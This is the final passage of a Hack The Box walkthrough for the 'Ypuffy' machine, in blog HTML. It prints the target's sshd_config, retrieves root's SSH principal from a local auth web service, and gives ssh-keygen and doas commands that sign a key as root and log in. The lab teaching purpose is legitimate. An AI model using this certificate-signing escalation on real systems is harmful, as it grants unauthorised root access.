If we also check <code class="language-plaintext highlighter-rouge">sshd_config</code> in <code class="language-plaintext highlighter-rouge">/etc/ssh/</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#	$OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile	.ssh/authorized_keys

#AuthorizedPrincipalsFile none

AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u
AuthorizedPrincipalsCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
ChallengeResponseAuthentication no

AllowAgentForwarding no
AllowTcpForwarding no
#GatewayPorts no
X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem	sftp	/usr/libexec/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

</code></pre></div></div>
<p>This part :
<br><img src="/images/hackthebox/ypuffy/15.png" alt="" class="align-center"><br><br>
So that http service is responsible for some ssh authentication stuff , and we can request keys from <code class="language-plaintext highlighter-rouge">/sshauth?type=keys&amp;username=</code> and principals from <code class="language-plaintext highlighter-rouge">/sshauth?type=principals&amp;username=</code> , requesting keys for root gives us no response , but requesting the principal we get <code class="language-plaintext highlighter-rouge">3m3rgencyB4ckd00r</code>
<br><img src="/images/hackthebox/ypuffy/16.png" alt="" class="align-center"><br><br></p>

<h2 id="generating-and-signing-ssh-keys--getting-root">Generating and signing ssh keys , Getting root</h2>
<p>So now we have root’s principal <code class="language-plaintext highlighter-rouge">3m3rgencyB4ckd00r</code>. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.<br>
The problem is , as <code class="language-plaintext highlighter-rouge">alice1978</code> we are not authorized to do this. On linux we could check if we can run elevated commands with <code class="language-plaintext highlighter-rouge">sudo -l</code> but here there’s no sudo , instead of that there’s a command called <code class="language-plaintext highlighter-rouge">doas</code> , if we check the config file for it :
<br><img src="/images/hackthebox/ypuffy/17.png" alt="" class="align-center"><br><br>
We can run <code class="language-plaintext highlighter-rouge">ssh-keygen</code> as <code class="language-plaintext highlighter-rouge">userca</code> without password.<br>
First step is to create ssh keys for <code class="language-plaintext highlighter-rouge">alice1978</code> 
<code class="language-plaintext highlighter-rouge">ssh-keygen -t rsa -f /tmp/id_rsa</code>
<br><img src="/images/hackthebox/ypuffy/18.png" alt="" class="align-center"><br><br>
Then we need the certificate (<code class="language-plaintext highlighter-rouge">ca</code>) in <code class="language-plaintext highlighter-rouge">/home/userca/</code> so we will cd there 
<br><img src="/images/hackthebox/ypuffy/19.png" alt="" class="align-center"><br><br>
And sign the ssh keys we have just created as root
<code class="language-plaintext highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa</code></p>

<p><code class="language-plaintext highlighter-rouge">doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub</code>
<br><img src="/images/hackthebox/ypuffy/20.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">-s</code> for certificate , <code class="language-plaintext highlighter-rouge">-I</code> for identity and <code class="language-plaintext highlighter-rouge">-n</code> for principal
Finally we will ssh as root :
<code class="language-plaintext highlighter-rouge">ssh -i /tmp/id_rsa root@localhost</code>
<br><img src="/images/hackthebox/ypuffy/21.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/dab/">Hack The Box - Dab</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/giddy/">Hack The Box - Giddy</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-02-09T07:00:00+02:00">February 9, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/dab/" class="pagination--pager" title="Hack The Box - Dab
">Previous</a>
    
    
      <a href="/hack-the-box/giddy/" class="pagination--pager" title="Hack The Box - Giddy
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
